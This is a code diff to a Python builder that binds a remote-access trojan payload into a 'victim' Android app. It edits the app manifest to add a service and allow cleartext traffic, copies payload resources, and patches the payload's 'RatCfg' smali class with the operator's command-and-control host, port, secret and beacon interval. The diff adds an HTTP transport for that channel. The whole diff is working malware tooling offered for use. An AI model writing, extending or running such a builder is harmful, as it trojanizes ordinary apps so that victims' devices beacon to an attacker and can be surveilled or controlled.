@@ -223,6 +223,7 @@ def load_setting(setting_path, host, port, secret, tag, beacon_ms, timeout_ms, u
                 "host": host,
                 "port": port,
                 "protocol": "tls" if use_wss else "tcp",
+                "transport": "tcp",
                 "secret": secret,
                 "beacon_ms": beacon_ms,
                 "timeout_ms": timeout_ms,
@@ -238,6 +239,7 @@ def load_setting(setting_path, host, port, secret, tag, beacon_ms, timeout_ms, u
             "host": setting.get("host", host),
             "port": setting.get("port", port),
             "protocol": setting.get("protocol", "tls" if use_wss else "tcp"),
+            "transport": setting.get("transport", "tcp"),
             "secret": setting.get("secret", secret),
             "beacon_ms": setting.get("beacon_ms", beacon_ms),
             "timeout_ms": setting.get("timeout_ms", timeout_ms),
@@ -248,6 +250,7 @@ def load_setting(setting_path, host, port, secret, tag, beacon_ms, timeout_ms, u
         srv.setdefault("host", host)
         srv.setdefault("port", port)
         srv.setdefault("protocol", "tls" if use_wss else "tcp")
+        srv.setdefault("transport", "tcp")
         srv.setdefault("secret", secret)
         srv.setdefault("beacon_ms", beacon_ms)
         srv.setdefault("timeout_ms", timeout_ms)
@@ -261,6 +264,9 @@ def setting_values(setting):
     """Pulls the flat values the smali patcher needs out of the document."""
     srv = setting.get("server", {})
     proto = str(srv.get("protocol", "tcp")).lower()
+    transport = str(srv.get("transport", "tcp")).lower()
+    if transport not in ("tcp", "http"):
+        transport = "tcp"
     return {
         "host": str(srv.get("host", "127.0.0.1")),
         "port": int(srv.get("port", 8777)),
@@ -269,6 +275,7 @@ def setting_values(setting):
         "beacon_ms": int(srv.get("beacon_ms", 15000)),
         "timeout_ms": int(srv.get("timeout_ms", 10000)),
         "use_wss": proto in ("tls", "ssl", "wss"),
+        "transport": transport,
     }
 
 
@@ -364,6 +371,13 @@ def merge_manifest(victim_root, pkg):
             </intent-filter>
         </service>
 '''
+    # The HTTP transport needs cleartext HTTP allowed on Android 9+.
+    if "networkSecurityConfig" not in txt:
+        txt = txt.replace(
+            "<application",
+            '<application\n        android:networkSecurityConfig="@xml/network_security_config"',
+            1)
+
     # Insert the components right before </application>.
     idx = txt.rfind("</application>")
     if idx < 0:
@@ -375,16 +389,21 @@ def merge_manifest(victim_root, pkg):
 
 
 def copy_payload_resources(payload_root, victim_root):
-    """Copy res/xml/method.xml (referenced by the merged manifest)."""
-    src = os.path.join(payload_root, "res", "xml", "method.xml")
-    if not os.path.exists(src):
-        log("WARNING: payload has no res/xml/method.xml, IME will not resolve")
-        return False
+    """Copy the res/xml files the merged manifest points at."""
+    copied = False
     dst_dir = os.path.join(victim_root, "res", "xml")
     os.makedirs(dst_dir, exist_ok=True)
-    shutil.copy2(src, os.path.join(dst_dir, "method.xml"))
-    log("copied res/xml/method.xml")
-    return True
+
+    for name in ("method.xml", "network_security_config.xml"):
+        src = os.path.join(payload_root, "res", "xml", name)
+        if not os.path.exists(src):
+            if name == "method.xml":
+                log("WARNING: payload has no res/xml/method.xml, IME will not resolve")
+            continue
+        shutil.copy2(src, os.path.join(dst_dir, name))
+        log(f"copied res/xml/{name}")
+        copied = True
+    return copied
 
 
 def write_setting_json(victim_root, setting, source=None):
@@ -416,7 +435,7 @@ def write_setting_json(victim_root, setting, source=None):
 # ---------------------------------------------------------------------------
 
 def patch_cfg(victim_root, dst_smali_dir, pkg, host, port, secret, tag,
-              beacon_ms, timeout_ms, use_wss):
+              beacon_ms, timeout_ms, use_wss, transport="tcp"):
     """
     Patch the payload's RatCfg <clinit> with the operator's settings.
 
@@ -519,6 +538,7 @@ def patch_cfg(victim_root, dst_smali_dir, pkg, host, port, secret, tag,
     replace_int_field("BEACON_INTERVAL_MS", beacon_ms)
     replace_int_field("CONNECT_TIMEOUT_MS", timeout_ms)
     replace_bool_field("USE_WSS", use_wss)
+    replace_string_field("TRANSPORT", transport)
 
     if txt == orig:
         raise SystemExit("no config change applied")
@@ -616,7 +636,8 @@ def main(argv=None):
         copy_payload_resources(payload, victim)
         write_setting_json(victim, setting, args.setting if from_panel else None)
         patch_cfg(victim, dst_smali, pkg, cfg["host"], cfg["port"], cfg["secret"],
-                  cfg["tag"], cfg["beacon_ms"], cfg["timeout_ms"], cfg["use_wss"])
+                  cfg["tag"], cfg["beacon_ms"], cfg["timeout_ms"], cfg["use_wss"],
+                  cfg["transport"])
 
         os.makedirs(os.path.dirname(os.path.abspath(args.out)), exist_ok=True)
         build(victim, args.out)
